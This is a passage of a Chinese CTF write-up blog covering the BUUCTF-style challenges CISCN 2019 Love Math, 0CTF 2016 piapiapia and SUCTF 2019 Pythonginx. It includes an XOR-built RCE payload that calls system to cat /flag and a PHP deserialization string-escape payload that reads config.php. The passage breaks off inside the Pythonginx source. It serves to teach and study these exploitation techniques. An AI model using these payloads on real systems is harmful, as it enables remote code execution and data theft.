<span class=s1>&#39;tanh&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nx>preg_match_all</span><span class=p>(</span><span class=s1>&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;</span><span class=p>,</span> <span class=nv>$content</span><span class=p>,</span> <span class=nv>$used_funcs</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$used_funcs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=k>as</span> <span class=nv>$func</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$func</span><span class=p>,</span> <span class=nv>$whitelist</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;请不要输入奇奇怪怪的函数&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>//帮你算出答案
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>eval</span><span class=p>(</span><span class=s1>&#39;echo &#39;</span><span class=o>.</span><span class=nv>$content</span><span class=o>.</span><span class=s1>&#39;;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>快被搞死了，是一道有过滤限制的RCE，半天没有头绪就去看wp了。</p><p><a href=https://www.cnblogs.com/20175211lyz/p/11588219.html target=_blank rel="noopener noreffer">刷题记录：[CISCN 2019 初赛]Love Math</a></p><p>最后自己琢磨出来了一个payload，思路当然还是参考上面师傅博客的。</p><p>利用<code>$whitelist</code>里的函数名称和数字遍历异或<code>^</code>，Fuzz找出来需要的字母，然后拼接一个<code>_GET</code>传参执行命令。</p><p>Fuzz的代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$whitelist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;abs&#39;</span><span class=p>,</span> <span class=s1>&#39;acos&#39;</span><span class=p>,</span> <span class=s1>&#39;acosh&#39;</span><span class=p>,</span> <span class=s1>&#39;asin&#39;</span><span class=p>,</span> <span class=s1>&#39;asinh&#39;</span><span class=p>,</span> <span class=s1>&#39;atan2&#39;</span><span class=p>,</span> <span class=s1>&#39;atan&#39;</span><span class=p>,</span> <span class=s1>&#39;atanh&#39;</span><span class=p>,</span> <span class=s1>&#39;base_convert&#39;</span><span class=p>,</span> <span class=s1>&#39;bindec&#39;</span><span class=p>,</span> <span class=s1>&#39;ceil&#39;</span><span class=p>,</span> <span class=s1>&#39;cos&#39;</span><span class=p>,</span> <span class=s1>&#39;cosh&#39;</span><span class=p>,</span> <span class=s1>&#39;decbin&#39;</span><span class=p>,</span> <span class=s1>&#39;dechex&#39;</span><span class=p>,</span> <span class=s1>&#39;decoct&#39;</span><span class=p>,</span> <span class=s1>&#39;deg2rad&#39;</span><span class=p>,</span> <span class=s1>&#39;exp&#39;</span><span class=p>,</span> <span class=s1>&#39;expm1&#39;</span><span class=p>,</span> <span class=s1>&#39;floor&#39;</span><span class=p>,</span> <span class=s1>&#39;fmod&#39;</span><span class=p>,</span> <span class=s1>&#39;getrandmax&#39;</span><span class=p>,</span> <span class=s1>&#39;hexdec&#39;</span><span class=p>,</span> <span class=s1>&#39;hypot&#39;</span><span class=p>,</span> <span class=s1>&#39;is_finite&#39;</span><span class=p>,</span> <span class=s1>&#39;is_infinite&#39;</span><span class=p>,</span> <span class=s1>&#39;is_nan&#39;</span><span class=p>,</span> <span class=s1>&#39;lcg_value&#39;</span><span class=p>,</span> <span class=s1>&#39;log10&#39;</span><span class=p>,</span> <span class=s1>&#39;log1p&#39;</span><span class=p>,</span> <span class=s1>&#39;log&#39;</span><span class=p>,</span> <span class=s1>&#39;max&#39;</span><span class=p>,</span> <span class=s1>&#39;min&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_getrandmax&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_rand&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_srand&#39;</span><span class=p>,</span> <span class=s1>&#39;octdec&#39;</span><span class=p>,</span> <span class=s1>&#39;pi&#39;</span><span class=p>,</span> <span class=s1>&#39;pow&#39;</span><span class=p>,</span> <span class=s1>&#39;rad2deg&#39;</span><span class=p>,</span> <span class=s1>&#39;rand&#39;</span><span class=p>,</span> <span class=s1>&#39;round&#39;</span><span class=p>,</span> <span class=s1>&#39;sin&#39;</span><span class=p>,</span> <span class=s1>&#39;sinh&#39;</span><span class=p>,</span> <span class=s1>&#39;sqrt&#39;</span><span class=p>,</span> <span class=s1>&#39;srand&#39;</span><span class=p>,</span> <span class=s1>&#39;tan&#39;</span><span class=p>,</span> <span class=s1>&#39;tanh&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$exp</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>count</span><span class=p>(</span><span class=nv>$whitelist</span><span class=p>);</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=nv>$j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=nv>$j</span> <span class=o>&lt;</span> <span class=mi>1000</span><span class=p>;</span> <span class=nv>$j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>		<span class=nv>$exp</span><span class=o>=</span><span class=nv>$whitelist</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>^</span><span class=nv>$j</span><span class=o>.</span><span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=nv>$whitelist</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34;^&#34;</span><span class=o>.</span><span class=nv>$j</span><span class=o>.</span><span class=s2>&#34;----&#34;</span><span class=o>.</span><span class=nv>$exp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>需要知道的有，php某个版本以后可以使用函数名加<code>()</code>的方式调用函数，如</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>base_convert</span><span class=p>(</span><span class=s2>&#34;strtoupper&#34;</span><span class=p>,</span> <span class=mi>36</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$cos</span><span class=o>=</span><span class=nx>base_convert</span><span class=p>(</span><span class=s2>&#34;2927671435926243&#34;</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>36</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=nv>$cos</span><span class=p>(</span><span class=s2>&#34;abc&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>上面代码是把字符串<strong>strtoupper</strong>赋值到变量<code>$cos</code>，然后直接使用<code>$cos()</code>执行<code>strtoupper()</code>函数。代码中使用<code>base_convert</code>函数也是这道题的一种思路哦。﹙ˊ_>ˋ﹚</p><p>还需要知道的是异或的时候会提示：字符串和数字不能直接异或，使用括号<code>()</code>括起来就可以了。<code>$</code>如果直接拼接到字符串上也是不可以的，需要使用形如<code>$$cos</code>才可以正确的指向变量。</p><p>最终payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>?</span><span class=nx>c</span><span class=o>=</span><span class=nv>$cos</span><span class=o>=</span><span class=p>(</span><span class=nx>is_finite</span><span class=o>^</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span><span class=o>.</span><span class=p>(</span><span class=nx>rad2deg</span><span class=o>^</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span><span class=o>.</span><span class=p>(</span><span class=mi>5</span><span class=p>));</span><span class=nv>$cos</span><span class=o>=</span><span class=nv>$$cos</span><span class=p>;</span><span class=nv>$cos</span><span class=p>{</span><span class=mi>0</span><span class=p>}(</span><span class=nv>$cos</span><span class=p>{</span><span class=mi>1</span><span class=p>})</span><span class=o>&amp;</span><span class=mi>0</span><span class=o>=</span><span class=nx>system</span><span class=o>&amp;</span><span class=mi>1</span><span class=o>=</span><span class=nx>cat</span> <span class=o>/</span><span class=nx>flag</span>
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=0ctf-2016piapiapia class=headerLink><a href=#0ctf-2016piapiapia class=header-mark></a>[0CTF 2016]piapiapia</h1><p>使用目录扫描发现了www.zip网站备份。</p><p>网站结构</p><blockquote><p>static</p><p>upload</p><p>class.php</p><p>config.php</p><p>index.php</p><p>profile.php</p><p>register.php</p><p>update.php</p></blockquote><p>发现有register就去注册个试试呗</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210309102253.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210309102253.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210309102253.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210309102253.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210309102253.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210309102253.png></p><p>注册成功就跳转到update.php界面了，是个修改信息的，查看源码，修改信息有手机号</p><p>邮箱、昵称、图片，还用了一些正则表达式过滤，如手机必须11位、邮箱有@和点、昵称长度不大于10、图片名称使用了md5进行加密。填写信息以后跳转到了profile.php页面。注意到图片所在的标签是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;data:image/gif;base64,.......</span>
</span></span></code></pre></td></tr></table></div></div><p>查看源码profile.php中是这样的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$profile</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$profile</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$phone</span> <span class=o>=</span> <span class=nv>$profile</span><span class=p>[</span><span class=s1>&#39;phone&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=nv>$email</span> <span class=o>=</span> <span class=nv>$profile</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=nv>$nickname</span> <span class=o>=</span> <span class=nv>$profile</span><span class=p>[</span><span class=s1>&#39;nickname&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=nv>$photo</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$profile</span><span class=p>[</span><span class=s1>&#39;photo&#39;</span><span class=p>]));</span>
</span></span></code></pre></td></tr></table></div></div><p>读取文件以后使用base64加密的话上传的地方肯定是不能用图片马什么的了。还注意到使用了<code>unserialize</code>，序列化也是思路。想试试直接读flag所在文件，在config.php中找到了flag所在地</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>	<span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;hostname&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;root&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;database&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><del>下载的源码肯定不会把flag直接给你</del>，要相办法读这个文件。看到了数据库配置，感觉序列化的对象应该也是从数据库读出来的，还有一个文件没有看：class.php，顺便跟进一下user对象相关的，注意到了注册和登陆都使用到了一个函数：<code>filter</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$username</span> <span class=o>=</span> <span class=k>parent</span><span class=o>::</span><span class=na>filter</span><span class=p>(</span><span class=nv>$username</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$password</span> <span class=o>=</span> <span class=k>parent</span><span class=o>::</span><span class=na>filter</span><span class=p>(</span><span class=nv>$password</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>跟进一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>filter</span><span class=p>(</span><span class=nv>$string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$escape</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;\&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;\\\\&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$escape</span> <span class=o>=</span> <span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nx>implode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>,</span> <span class=nv>$escape</span><span class=p>)</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$string</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=nv>$escape</span><span class=p>,</span> <span class=s1>&#39;_&#39;</span><span class=p>,</span> <span class=nv>$string</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=nv>$safe</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;select&#39;</span><span class=p>,</span> <span class=s1>&#39;insert&#39;</span><span class=p>,</span> <span class=s1>&#39;update&#39;</span><span class=p>,</span> <span class=s1>&#39;delete&#39;</span><span class=p>,</span> <span class=s1>&#39;where&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$safe</span> <span class=o>=</span> <span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nx>implode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>,</span> <span class=nv>$safe</span><span class=p>)</span> <span class=o>.</span> <span class=s1>&#39;/i&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=nv>$safe</span><span class=p>,</span> <span class=s1>&#39;hacker&#39;</span><span class=p>,</span> <span class=nv>$string</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>过滤<code>_</code>，select、insert、update、delete、where会被替换成<code>hacker</code>，where长度是5，hacker长度是6，敏感一点的应该想到了序列化字符串对象也是用字符串长度的，这样长度改变的话，可以使用<a href=https://my.oschina.net/u/3076320/blog/4372683 target=_blank rel="noopener noreffer">PHP反序列化字符串逃逸</a>，序列化的结尾是<code>";}</code>可以手动构造闭合。</p><p>现在整理下思路。图片属性那里可以读文件，过滤函数会导致序列化字符串逃逸，所以就构造photo读取config.php。那么逃逸的点在哪里？电话只能是数字，邮箱需要有@等字符，图片会被md5加密，昵称哪里虽然有长度限制，但是如果我们传入数组的话就可以绕过。那么开工</p><p>先上payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&#34;;}s:5:&#34;photo&#34;;s:10:&#34;config.php&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>⭐参考了其他的好多博客，这里的点讲的很模糊，原来长度为5的字符串变成了长度为6的，应该是更不可能读不到payload的。</p><p>受到了这位师傅的博客<a href=https://blog.csdn.net/weixin_44077544/article/details/102703489 target=_blank rel="noopener noreffer">[0CTF 2016]piapiapia</a>，我尝试了下<code>$profile</code>属性其实是一个<strong>关联数组</strong>，是键值对形式的，并且字符串可能是嵌套起来的，形如</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>profile</span><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$file</span> <span class=o>=</span> <span class=s1>&#39;a:2:{s:8:&#34;nickname&#34;;s:5:&#34;where&#34;;s:5:&#34;photo&#34;;s:3:&#34;233&#34;;}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$upload</span> <span class=o>=</span><span class=s2>&#34;2333&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$s1</span><span class=o>=</span> <span class=k>new</span> <span class=nx>profile</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$s1</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>结果是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>7</span><span class=o>:</span><span class=s2>&#34;profile&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;file&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>56</span><span class=o>:</span><span class=s2>&#34;a:2:{s:8:&#34;</span><span class=nx>nickname</span><span class=s2>&#34;;s:15:&#34;</span><span class=nx>where</span><span class=s2>&#34;;s:5:&#34;</span><span class=nx>photo</span><span class=s2>&#34;;s:3:&#34;</span><span class=mi>233</span><span class=s2>&#34;;}&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;upload&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;2333&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><p>这种格式的，假如我们的payload是修改上面的upload，在一个字符串总长度s如上面的56读取所有变长的hacker以后，到了我们的payload地方，正常把我们构造的upload读取为对象，而后面真正的upload字符串就被舍去了。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103923.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103923.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103923.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103923.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103923.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103923.png></p><p>报错是因为nickname我们传入的是数组形式的，源代码里直接对数组进行操作肯定是报错的，但是我们需要的只有photo正常即可，可以看到后面我们文件更新成功了。</p><p>查看页面的图片内容</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103720.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103720.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103720.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103720.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103720.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103720.png></p><p>base64解码</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103747.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103747.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103747.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103747.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103747.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103747.png></p><hr><h1 id=suctf-2019pythonginx class=headerLink><a href=#suctf-2019pythonginx class=header-mark></a>[SUCTF 2019]Pythonginx</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310100334.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310100334.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310100334.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310100334.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310100334.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310100334.png></p><p>整理一下源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>getUrl</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;url&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>host</span> <span class=o>=</span> <span class=n>parse</span><span class=o>.</span><span class=n>urlparse</span><span class=p>(</span><span class=n>url</span><span class=p>)</span><span class=o>.</span><span class=n>hostname</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>host</span> <span class=o>==</span> <span class=s1>&#39;suctf.cc&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;我扌 your problem? 111&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>parts</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>urlsplit</span><span class=p>(</span><span class=n>url</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>host</span> <span class=o>=</span> <span class=n>parts</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>host</span> <span class=o>==</span> <span class=s1>&#39;suctf.cc&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;我扌 your problem? 222 &#34;</span> <span class=o>+</span> <span class=n>host</span>
</span></span><span class=line><span class=cl>    <span class=n>newhost</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>h</span> <span class=ow>in</span> <span class=n>host</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>newhost</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>h</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;idna&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>parts</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;.&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>newhost</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#去掉 url 中的空格</span>
</span></span><span class=line><span class=cl>    <span class=n>finalUrl</span> <span class=o>=</span> <span class=n>urlunsplit</span><span class=p>(</span><span class=n>parts</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>host</span> <span class=o>=</span> <span class=n>parse</span><span class=o>.</span><span class=n>urlparse</span><span class=p>(</span><span class=n>finalUrl</span><span class=p>)</span><span class=o>.</span><span class=n>hostname</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>host</span> <span class=o>==</span> <span class=s1>&#39;suctf.cc&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>finalUrl</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
